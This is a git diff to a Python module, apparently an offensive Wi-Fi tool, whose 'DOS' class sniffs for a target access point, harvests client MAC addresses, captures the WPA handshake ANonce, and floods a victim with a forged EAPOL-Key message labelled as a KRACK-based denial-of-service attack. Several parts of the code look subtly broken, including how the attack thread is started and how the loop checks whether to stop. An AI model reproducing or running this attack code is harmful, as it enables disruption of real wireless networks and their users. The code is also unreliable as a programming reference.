@@ -2,7 +2,7 @@
 import subprocess
 import threading
 import time
-from scapy.layers.dot11 import Dot11, Dot11Beacon
+from scapy.layers import Dot11, Dot11Beacon, RadioTap, EAPOL, EAPOL_Key, LLC, SNAP
 import scapy.all as scapy
 
 
@@ -15,9 +15,12 @@ class DOS:
         self.connectedUsers = set()
         self.running = False
         self.hopper_thread = None
-        self.setIface("monitor")
+        self.mac = set()
+        # Needed for DOS using KRACK
+        self.anonce = "0"
+        self.dos = None
+
         self.setChannel()
-        print("[DEBUG] DOS creado")
 
     def stop(self):
         self.running = False
@@ -114,8 +117,8 @@ class DOS:
     def setChannel(self) -> None:
         self.running = True
 
-        hopper_thread = threading.Thread(target=self.channelHopper, daemon=True)
-        hopper_thread.start()
+        self.hopper_thread = threading.Thread(target=self.channelHopper, daemon=True)
+        self.hopper_thread.start()
 
         while self.running:
             scapy.sniff(
@@ -127,7 +130,7 @@ class DOS:
             )
 
         self.running = False
-        hopper_thread.join(timeout=1)
+        self.hopper_thread.join(timeout=1)
 
     def setIface(self, mode):
         subprocess.run(["ip", "link", "set", self.iface, "down"], check=False)
@@ -142,10 +145,14 @@ class DOS:
             addresses = [wifi.addr1, wifi.addr2, wifi.addr3]
 
             if any(addr and addr.lower() == bssid for addr in addresses):
+                for addr in addresses:
+                    if addr and addr.lower() != self.BSSID.lower():
+                        self.mac.add(addr)
                 print(f"{wifi.addr2} -> {wifi.addr1}")
 
     def intercept(self) -> None:
         try:
+            self.setIface("monitor")
             t = time.time()
             print(f"sniff in {self.channel}")
             while time.time() - t < self.tIntercept:
@@ -160,6 +167,80 @@ class DOS:
         finally:
             print("[DEBUG] sniff terminado")
             self.stop()
+
+    def GetAnonce(self, pkt, victim: str) -> None:
+
+        if pkt.haslayer(EAPOL) and pkt.haslayer(EAPOL_Key):
+            eapol_key = pkt[EAPOL_Key]
+            key_info = int(eapol_key.key_info)
+            is_mic_set = bool(key_info & 0x0100)
+            is_ack_set = bool(key_info & 0x0080)
+            is_pairwise = bool(key_info & 0x0008)
+
+            # unique features of msg1
+            if is_ack_set and not is_mic_set:
+                self.anonce = eapol_key.anonce
+                return
+            # unique features of msg2
+            if (
+                is_mic_set
+                and not is_ack_set
+                and is_pairwise
+                and eapol_key.nonce != b"\x00" * 32
+            ):
+                self.running = False
+                return
+
+    def DOS(self, victim: str) -> None:
+        self.setIface("monitor")
+        while self.running:
+            scapy.sniff(
+                iface=self.iface,
+                prn=self.classifyPkt(victim),
+                timeout=1,
+                store=0,
+                stop_filter=lambda pkt: not self.running,
+            )
+        pkt = (
+            RadioTap()
+            / Dot11(
+                type=2,
+                subtype=0,
+                addr1=victim,
+                addr2=self.BSSID,
+                addr3=self.BSSID,
+            )
+            / LLC()
+            / SNAP()
+            / EAPOL(version=1, type=3)
+            / EAPOL_Key(
+                descriptor_type=2,
+                key_info=0x13CA,  # Install Bit, Ack, Key MIC, Secure, Pairwise
+                key_length=16,
+                replay_counter=2,
+                nonce=self.anonce,
+                key_iv=b"\x00" * 16,
+                key_rsc=b"\x00" * 8,
+                key_id=b"\x00" * 8,
+                key_mic=b"FA:KE",
+                key_data_len=1,
+                key_data=b"FA:KE",
+            )
+        )
+
+        def attack():
+            while self.DOS:
+                scapy.send(pkt)
+
+        dos = threading.Thread(target=attack(), daemon=True)
+        dos.start()
+
+    def StopDOS(self):
+        self.setIface("managed")
+
+        if self.dos is not None:
+            self.dos.join()
+            self.dos = None
 
 
 __all__ = ["DOS"]
